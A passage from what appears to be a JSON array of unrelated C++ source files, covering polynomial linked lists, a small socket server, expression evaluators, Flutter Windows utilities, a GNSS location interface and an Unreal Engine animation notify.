denominator;\n    char separator;\n    iss >> numerator >> separator >> denominator;\n    if (separator != '/')\n        return std::stof(he_so);\n    if (denominator == 0)\n    {\n        std::cout << \"mau so cua phan so khong the bang 0\\n\";\n\t\tsystem(\"pause>0\");;\n        exit(0);\n    }\n    return static_cast<float>(numerator) / denominator;\n}\nvoid in_da_thuc(List l)\n{\n    while(l.head)\n    {\n        in_don_thuc(l.head->donthuc);\n        std::cout << \" + \";\n        l.head = l.head->next;\n    }\n\tstd::cout << static_cast<char>(8) << \" \" << static_cast<char>(8);\n    std::cout << static_cast<char>(8) << \" \" << static_cast<char>(8);\n\tstd::cout << '\\n';\n}\nvoid in_don_thuc(Donthuc p)\n{\n\tif (p.he_so != 0)\n\t\tstd::cout << p.he_so << \"x^\" << p.bac;\n\telse\n\t\tstd::cout << '0';\n}\n//\nvoid swap(Donthuc &a, Donthuc &b)\n{\n\tDonthuc temp = a;\n\ta = b;\n\tb = temp;\n}\nvoid sx_da_thuc_bac_giam_dan(List l)\n{\n\tif(l.head == NULL || l.head == l.tail) return;\n\tNode* p = l.head;\n\twhile (p)\n\t{\n\t\tNode* max = p;\n\t\tfor (Node* q = p->next; q != NULL; q=q->next)\n\t\t\tif (q->donthuc.bac > max->donthuc.bac)\n\t\t\t\tmax = q;\n\t\tif (max != p)\n\t\t\tswap(max->donthuc, p->donthuc);\n\t\tp = p->next;\n\t}\n}\n//\nvoid xoa_phantu_sau_nut(List &l, Node* current)\n{\n\tif (l.head == NULL || current == NULL) return;\n\tif (current->next->next == NULL) l.tail = current;\n\tNode* next_next = current->next->next;\n\tdelete current->next;\n\tcurrent->next = next_next;\n}\nvoid xoa_d",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Server.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: aoropeza <aoropeza@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/03/23 15:58:15 by fgalan-r          #+#    #+#             */\n/*   Updated: 2024/04/08 11:05:58 by aoropeza         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../inc/Server.hpp\"\n\nServer::Server(int port, std::string pass) : _port(port), _pass(pass)\n{\n\tstd::cout << \"Server created\" << std::endl;\n\tstd::cout << \"port: \" << _port << std::endl;\n\tstd::cout << \"pass: \" << _pass << std::endl;\n\t_signal = false;\n}\n\nServer::~Server()\n{\n\tstd::cout << \"Server deleted\" << std::endl;\n}\n\n// clear the clients\nvoid Server::clearClients(int fd)\n{\n\t// remove the client from the pollfd\n\tfor(size_t i = 0; i < _fds.size(); i++)\n\t{ \n\t\tif (_fds[i].fd == fd)\n\t\t{\n\t\t\t_fds.erase(_fds.begin() + i); \n\t\t\tbreak;\n\t\t}\n \t}\n\t// remove the client from the vector of clients\n \tfor(size_t i = 0; i < _users.size(); i++)\n\t{ \n\t\tif (_users[i].getFd() == fd)\n\t\t{\n\t\t\t_users.erase(_users.begin() + i); \n\t\t\tbreak;\n\t\t}\n \t}\n}\n\n// initialize the static boolean\nbool Server::_signal = false; \n\n\nvoid Server::signalHandler(int signum)\n{\n\t(void)signum;\n\tstd::cout << std::endl << \"Signal Received!\" << std::endl;\n\t// set the static boolean to true to stop the server\n\tServer::_signal = true;\n}\n\nint\tServer::validPort(const std::string port)\n{\n\tfor (size_t i = 0; i < port.length(); i++)\n\t{\n\t\tif (!std::isdigit(port[i]))\n\t\t\treturn (0);\n\t}\n\tint num = std::stoi(port);\n\t// Ports 0 to 1023 are reserved for specific services and protocols\n\tif (num < 1024 || num > 65535) \n\t\treturn (0);\n\treturn (1);\n}\n\nint\tServer::validPass(const std::string pass)\n{\n\tif (pass.length() > 8)\n\t\treturn (0);\n\treturn (1);\n}\n\nvoid Server::closeFds()\n{\n\t// close all the clients\n\tfor(size_t i = 0; i < _users.size(); i++)\n\t{ \n\t\tstd::cout << RED << \"Client [\" << _users[i].getFd() << \"] Disconnected\" << WHI << std::endl;\n\t\tclose(_users[i].getFd());\n\t}\n\t// close the server socket\n\tif (_serverFd != -1)\n\t{\n\t\tstd::cout << RED << \"Server [\" << _serverFd << \"] Disconnected\" << WHI << std::endl;\n\t\tclose(_serverFd);\n\t}\n}\n\nvoid Server::receiveNewData(int fd)\n{\n\tchar buff[1024]; \t\t\t\t// buffer for the received data\n\tmemset(buff, 0, sizeof(buff));\t// clear the buffer\n\n\tssize_t bytes = recv(fd, buff, sizeof(buff) - 1 , 0); // receive the data\n\t// check if the client disconnected\n\tif(bytes <= 0)\n\t{ \n\t\tstd::cout << RED << \"Client [\" << fd << \"] Disconnected\" << WHI << std::endl;\n\t\tclearClients(fd);\t// clear the client\n\t\tclose(fd);\t\t\t// close the client socket\n\t}\n \telse\n\t{\n\t\t// print the received data\n\t\tbuff[bytes] = '\\0';\n\t\tstd::cout << YEL << \"Client [\" << fd << \"] Data: \" << WHI << buff;\n\t\t// code to process the received data\n\t\tstd::string message = \"message received\\n\";\n\t\tsendMessage(fd, message);\n\t}\n}\n\nint Server::sendMessage(int fd, const std::string str)\n{\n\tif (send(fd, str.c_str(), str.length(), 0) == -1)\n\t{\n\t\tstd::cout << \"error sending message\" << std::endl;\n\t\treturn (1);\n\t}\n\treturn (0);\n}\n\nvoid Server::acceptNewUser()\n{\n\t// create a new client\n\tUser\t\t\t\tuser; \n\tstruct sockaddr_in\tuserAdd;\n\tstruct pollfd\t\tnewPoll;\n\tsocklen_t \t\t\tlen = sizeof(userAdd);\n\t// accept the new client\n\tint newUserFd = accept(_serverFd, (sockaddr *)&(userAdd), &len); \n\tif (newUserFd == -1)\n  \t{\n\t\tstd::cout << \"accept() failed\" << std::endl; \n\t\treturn;\n\t}\n\t// set the socket option (O_NONBLOCK) for non-blocking socket\n\tif (fcntl(newUserFd, F_SETFL, O_NONBLOCK) == -1) \n\t{\n\t\tstd::cout << \"fcntl() failed\" << std::endl; \n\t\treturn;\n\t}\n\n\tnewPoll.fd = newUserFd;\t\t\t\t\t\t\t// add the client socket to the pollfd\n\tnewPoll.events = POLLIN;\t\t\t\t\t\t// set the event to POLLIN for reading data\n\tnewPoll.revents = 0;\t\t\t\t\t\t\t// set the revents to 0\n\n\tuser.setFd(newUserFd);\t\t\t\t\t\t\t// set the client file descriptor\n\tuser.setIpAdd(inet_ntoa((userAdd.sin_addr)));\t// convert the ip address to string and set it\n\t_users.push_back(user);\t\t\t\t\t\t\t// add the client to the vector of clients\n\t_fds.push_back(newPoll);\t\t\t\t\t\t// add the client socket to the pollfd\n\n\tstd::cout << GRE << \"User [\" << newUserFd << \"] Connected\" << WHI << std::endl;\n}\n\nvoid Server::configServerSocket()\n{\n\tstruct sockaddr_in\tserverAdd;\n\tstruct pollfd\t\tnewPoll;\n\tserverAdd.sin_family = AF_INET;\t\t\t\t// set the address family to ipv4\n\tserverAdd.sin_addr.s_addr = INADDR_ANY;\t\t// set the address to any local machine address\n\tserverAdd.sin_port = htons(this->_port);\t// convert the port t",
    "#include <iostream>\r\n#include <fstream>\r\n#include <iomanip>\r\nusing namespace std;\r\n\r\nint main() {\r\n\tsetlocale(LC_ALL, \"Rus\");\r\n\tsrand(time(NULL));\r\n\tstd::ofstream out;\r\n\t//\u0441\u043e\u0437\u0434\u0430\u044e \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435\r\n\tint result;\r\n\tdouble long printresult;\r\n\tint firstparam;\r\n\tint ffirstparam;\r\n\tint secondparam;\r\n\tint msecondparam;\r\n\tint smartparam;\r\n\tint ssmartparam;\r\n\tint count;\r\n\tint step;\r\n\tint CountClon;\r\n\tint printcount;\r\n\tint i = 0;\r\n\tint answer;\r\n\tbool start = true;\r\n\tint col;\r\n\tout.open(\"col.txt\");\r\n\t//\u0441\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u044e \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u043e\u0432\u0442\u043e\u0440\u0435\u043d\u0438\u0439 \u043d\u0443\u0436\u043d\u043e \u0438 \u043a\u0430\u043a\u043e\u0439 \u0431\u0443\u0434\u0435\u0442 \u043e\u0442\u0432\u0435\u0442\r\n\tcout << \"\u0421\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u043e\u0432\u0442\u043e\u0440\u0435\u043d\u0438\u0439 \u0432\u0430\u043c \u043d\u0430\u0434\u043e?\" << endl << \">>>\";\r\n\tcin >> col;\r\n\tcout << \"\u041a\u0430\u043a\u043e\u0439 \u043e\u0442\u0432\u0435\u0442 \u0432\u0430\u043c \u043d\u0443\u0436\u0435\u043d \u0432\u0430\u043c \u043d\u0443\u0436\u0435\u043d?\" << endl << \">>>\";\r\n\t//____________________\r\n\tif (col == 9931993) {\r\n\t\tstart = false;\r\n\t}\r\n\r\n\tcin >> answer;\r\n\t//\u0441\u043e\u0437\u0434\u0430\u044e \u0446\u0438\u043a\u043b\r\n\twhile (start)\r\n\t{\r\n\t\t//\u0441\u043e\u0437\u0434\u0430\u044e \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430\r\n\t\tstep = rand() % 40 + 1;\r\n\t\tcount = rand() % 40 + 1;\r\n\t\tCountClon = count;\r\n\t\tffirstparam = rand() % 200000 + (-2000);\r\n\t\tfirstparam = rand() % 200000 + (-2000);\r\n\t\tsecondparam = rand() % 200000 + (-2000);\r\n\t\tmsecondparam = rand() % 200000 + (-2000);\r\n\t\tsmartparam = rand() % 200 + (-20);\r\n\t\tssmartparam = rand() % 200 + (-20);\r\n\t\t//\u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u043f\u043e\u0434\u0431\u043e\u0440\u0430:\r\n\t\t//cout << count << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \";\r\n\t\t//out << count << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \":\r\n\t\tprintcount = count;\r\n\t\tfor (int i = 0; i < step - 1; i++)\r\n\t\t{\r\n\t\t\tcount *= CountClon;\r\n\t\t}\r\n\t\t//\u0441\u0447\u0438\u0442\u0430\u044e \u043e\u0442\u0432\u0435\u0442\r\n\t\tresult = ssmartparam * msecondparam - smartparam * count + secondparam + firstparam + ffirstparam;\r\n\t\tprintresult = ssmartparam * msecondparam - smartparam * count + secondparam + firstparam + ffirstparam;\r\n\t\t//\u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u043f\u043e\u0434\u0431\u043e\u0440\u0430:\r\n\t\t//cout << result << endl;\r\n\t\t//cout << result << endl;\r\n\t\t//\u0415\u0441\u043b\u0438 \u043e\u0442\u0432\u0435\u0442 \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0432\u0435\u043d \u0442\u043e\u043c\u0443 \u0447\u0442\u043e \u0443\u043a\u0430\u0437\u0430\u043b \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\r\n\t\tif (result == (answer) && start) {\r\n\t\t\t//\u0432\u044b\u0432\u043e\u0436\u0443 \u0432  \u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\r\n\t\t\tcout << ssmartparam << \" * \" << msecondparam << \" - \" << smartparam << \" * \" << printcount << \"^\" << step << \" + \" << secondparam << \" + \" << firstparam << \" + \" << ffirstparam << \" = \" << result << endl;\r\n\t\t\t//\u0441\u043e\u0445\u0440\u0430\u043d\u044f\u044e \u0432 \u0444\u0430\u0439\u043b\r\n\t\t\tout << msecondparam << \" - \" << smartparam << \" * \" << printcount << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \" << result << endl;\r\n\t\t\ti++;\r\n\t\t\tif (i == col) {\r\n\t\t\t\t//\u0437\u0430\u043a\u0440\u044b\u0432\u0430\u044e \u0444\u0430\u0439\u043b\r\n\t\t\t\tout.close();\r\n\t\t\t\tstart = false;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* Copyright (c) 2017-2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#include \"GnssAdapter.h\"\n#include \"location_interface.h\"\n\nstatic GnssAdapter* gGnssAdapter = NULL;\n\nstatic void initialize();\nstatic void deinitialize();\n\nstatic void addClient(LocationAPI* client, const LocationCallbacks& callbacks);\nstatic void removeClient(LocationAPI* client, removeClientCompleteCallback rmClientCb);\nstatic void requestCapabilities(LocationAPI* client);\n\nstatic uint32_t startTracking(LocationAPI* client, TrackingOptions&);\nstatic void updateTrackingOptions(LocationAPI* client, uint32_t id, TrackingOptions&);\nstatic void stopTracking(LocationAPI* client, uint32_t id);\n\nstatic void gnssNiResponse(LocationAPI* client, uint32_t id, GnssNiResponse response);\nstatic uint32_t gnssDeleteAidingData(GnssAidingData& data);\nstatic void gnssUpdateXtraThrottle(const bool enabled);\n\nstatic void setControlCallbacks(LocationControlCallbacks& controlCallbacks);\nstatic uint32_t enable(LocationTechnologyType techType);\nstatic void disable(uint32_t id);\nstatic uint32_t* gnssUpdateConfig(const GnssConfig& config);\nstatic uint32_t* gnssGetConfig(GnssConfigFlagsMask mask);\n\nstatic void gnssUpdateSvTypeConfig(GnssSvTypeConfig& config);\nstatic void gnssGetSvTypeConfig(GnssSvTypeConfigCallback& callback);\nstatic void gnssResetSvTypeConfig();\n\nstatic void injectLocation(double latitude, double longitude, float accuracy);\nstatic void injectLocationExt(const GnssLocationInfoNotification &locationInfo);\nstatic void injectTime(int64_t time, int64_t timeReference, int32_t uncertainty);\n\nstatic void agpsInit(const AgpsCbInfo& cbInfo);\nstatic void agpsDataConnOpen(AGpsExtType agpsType, const char* apnName, int apnLen, int ipType);\nstatic void agpsDataConnClosed(AGpsExtType agpsType);\nstatic void agpsDataConnFailed(AGpsExtType agpsType);\nstatic void getDebugReport(GnssDebugReport& report);\nstatic void updateConnectionStatus(bool connected, int8_t type, bool roaming,\n                                   NetworkHandle networkHandle, string& apn);\nstatic void getGnssEnergyConsumed(GnssEnergyConsumedCallback energyConsumedCb);\nstatic void enableNfwLocationAccess(bool enable);\nstatic void nfwInit(const NfwCbInfo& cbInfo);\nstatic void getPowerStateChanges(std::function<void(bool)> powerStateCb);\n\nstatic void odcpiInit(const OdcpiRequestCallback& callback, OdcpiPrioritytype priority);\nstatic void odcpiInject(const Location& location);\n\nstatic void blockCPI(double latitude, double longitude, float accuracy,\n                     int blockDurationMsec, double latLonDiffThreshold);\nstatic void updateBatteryStatus(bool charging);\nstatic void updateSystemPowerState(PowerStateType systemPowerState);\nstatic uint32_t setConstrainedTunc (bool enable, float tuncConstraint,\n                                    uint32_t energyBudget);\nstatic uint32_t setPositionAssistedClockEstimator(bool enable);\nstatic uint32_t gnssUpdateSvConfig(const GnssSvTypeConfig& constellationEnablementConfig,\n                                   const GnssSvIdConfig& blacklistSvConfig);\nstatic uint32_t gnssResetSvConfig();\nstatic uint32_t configLeverArm(const LeverArmConfigInfo& configInfo);\nstatic uint32_t configRobustLocation(bool enable, bool enableForE911);\nstatic uint32_t configMinGpsWeek(uint16_t minGpsWeek);\nstatic uint32_t configDeadReckoningEngineParams(const DeadReckoningEngineConfig& dreConfig);\nstatic uint32_t gnssUpdateSecondaryBandConfig(const GnssSvTypeConfig& secondaryBandConfig);\nstat",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\n#include <sstream>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nbool isOperator(char c) {\r\n\treturn c == '+' || c == '-' || c == '*' || c == '/' || c == '^' || c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q';\r\n}\r\n\r\nbool isDigit(char c) {\r\n\treturn c >= '0' && c <= '9';\r\n}\r\n\r\nbool isLeftParenthesis(char c) {\r\n\treturn c == '(';\r\n}\r\n\r\nbool isRightParenthesis(char c) {\r\n\treturn c == ')';\r\n}\r\n\r\nbool isWhiteSpace(char c) {\r\n\treturn c == ' ' || c == '\\t' || c == '\\n';\r\n}\r\n\r\nbool isInvalidChar(char c) {\r\n\treturn !isOperator(c) && !isDigit(c) && !isLeftParenthesis(c) && !isRightParenthesis(c) && !isWhiteSpace(c);\r\n}\r\n\r\nbool isOperatorHigherOrEqual(char op1, char op2) {\r\n\tif ((op1 == '*' || op1 == '/' || op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '+' || op2 == '-')) {\r\n\t\treturn true;\r\n\t}\r\n\tif ((op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '*' || op2 == '/')) {\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\ndouble calculate(double operand1, double operand2, char op) {\r\n\tswitch (op) {\r\n\t\tcase '+':\r\n\t\t\treturn operand1 + operand2;\r\n\t\tcase '-':\r\n\t\t\treturn operand1 - operand2;\r\n\t\tcase '*':\r\n\t\t\treturn operand1 * operand2;\r\n\t\tcase '/':\r\n\t\t\treturn operand1 / operand2;\r\n\t\tcase '^':\r\n\t\t\treturn pow(operand1, operand2);\r\n\t\tcase 's':\r\n\t\t\treturn sin(operand2 * M_PI / 180.0);\r\n\t\tcase 'c':\r\n\t\t\treturn cos(operand2 * M_PI / 180.0);\r\n\t\tcase 't':\r\n\t\t\treturn tan(operand2 * M_PI / 180.0);\r\n\t\tcase 'l':\r\n\t\t\treturn log(operand2);\r\n\t\tcase 'q':\r\n\t\t\treturn sqrt(operand2);\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\nbool evaluate(string expr, double& result) {\r\n\tstack<double> operands;\r\n\tstack<char> operators;\r\n\tint i = 0;\r\n\tint len = expr.length();\r\n\twhile (i < len) {\r\n\t\tchar c = expr[i];\r\n\t\tif (isWhiteSpace(c)) {\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isInvalidChar(c)) {\r\n\t\t\treturn false;\r\n\r\n\t\t}\r\n\t\tif (isDigit(c)) {\r\n\t\t\tdouble operand;\r\n\t\t\tstringstream ss;\r\n\t\t\tss << c;\r\n\t\t\ti++;\r\n\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\tss << expr[i];\r\n\t\t\t\ti++;\r\n\t\t\t}\r\n\t\t\tss >> operand;\r\n\t\t\toperands.push(operand);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isOperator(c)) {\r\n\t\t\tif (c == '-' && (i == 0 || isOperator(expr[i - 1]) || isLeftParenthesis(expr[i - 1]))) {\r\n\t\t\t\tdouble operand;\r\n\t\t\t\tstringstream ss;\r\n\t\t\t\tss << '-';\r\n\t\t\t\ti++;\r\n\t\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\t\tss << expr[i];\r\n\t\t\t\t\ti++;\r\n\t\t\t\t}\r\n\t\t\t\tss >> operand;\r\n\t\t\t\toperands.push(operand);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\twhile (!operators.empty() && isOperatorHigherOrEqual(operators.top(), c)) {\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isLeftParenthesis(c)) {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isRightParenthesis(c)) {\r\n\t\t\tif (operators.empty()) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tchar op = operators.top();\r\n\t\t\twhile (!isLeftParenthesis(op)) {\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\top = operators.top();\r\n\t\t\t}\r\n\t\t\toperators.pop();\r\n\t\t\tif (!operators.empty() && (operators.top() == 's' || operators.top() == 'c' || operators.top() == 't' || operators.top() == 'l' || operators.top() == 'q')) {\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble operand = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(0, operand, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q') {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t}\r\n\twhile (!operators.empty()) {\r\n\t\tchar op = operators.top();\r\n\t\toperators.pop();\r\n\t\tif (isLeftParenthesis(op) || operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand2 = operands.top();\r\n\t\toperands.pop();\r\n\t\tif (operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand1 = operands.top();\r\n\t\toperands.pop();\r\n\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\toperands.push(result);\r\n\t}\r\n\tif (operands.empty()) {\r\n\t\treturn false;\r\n\t}\r\n\tresult = operands.top();\r\n\treturn true;\r\n}\r\n\r\nint main() {\r\n\tstring expr;\r\n\tcout << \"input an expression: \";\r\n\tgetline(cin, expr);\r\n\tdouble result;\r\n\tif (evaluate(expr, result)) {\r\n\t\tprintf(\"%lf\\n\", result);\r\n\t} else {\r\n\t\tcout << \"illegal expression!\" << endl;\r\n\t}\r\n    cout<<\"press any key to continue...\";\r\n    getchar();\r\n\treturn 0;\r\n}\r\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"VolcanicFireSlashAnimNotify.h\"\n#include \"C:\\Program Files\\Epic Games\\UE_5.2\\Engine\\Plugins\\Marketplace\\PaperZD\\Source\\PaperZD\\Public\\AnimSequences\\Players\\PaperZDAnimPlayer.h\"\n\nvoid UVolcanicFireSlashAnimNotify::OnReceiveNotify_Implementation(UPaperZDAnimInstance* OwningInstance)\n{\n\tif (OwningInstance) {\n\t\tthis->SetSpawnProperty(OwningInstance);\n\t\tthis->SpawnDistanceX = 50.0f;\n\t\tif (OwningInstance->GetOwningActor()) {\n\t\t\tif (ABaseCharacter* BaseCharacter = Cast<ABaseCharacter>(OwningInstance->GetOwningActor())) {\n\t\t\t\tthis->SpawnContinuously(BaseCharacter);\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid UVolcanicFireSlashAnimNotify::SpawnContinuously(ABaseCharacter* OwningCharacter)\n{\n\tif (OwningCharacter) {\n\t\tif (CurrentSpawnTime <= MaxSpawnTimes) {\n\t\t\tFActorSpawnParameters SpawnParams;\n\t\t\tSpawnParams.Owner = OwningCharacter;\n\t\t\tSpawnLocation.X += (SpawnRotation.Yaw != 0) ? -SpawnDistanceX : SpawnDistanceX;\n\t\t\tif (AVolcanicFireExplode* VolcanicFireExplode = GetWorld()->SpawnActor<AVolcanicFireExplode>(AVolcanicFireExplode::StaticClass(), SpawnLocation, SpawnRotation, SpawnParams))\n\t\t\t\tGetWorld()->GetTimerManager().SetTimer(SpawnHandle, FTimerDelegate::CreateLambda([this, OwningCharacter]() {\n\t\t\t\tthis->SpawnContinuously(OwningCharacter);\n\t\t\t\t\t}), VolcanicFireExplode->Flipbook->GetTotalDuration(), false);\n\t\t\t++CurrentSpawnTime;\n\t\t}\n\t\telse 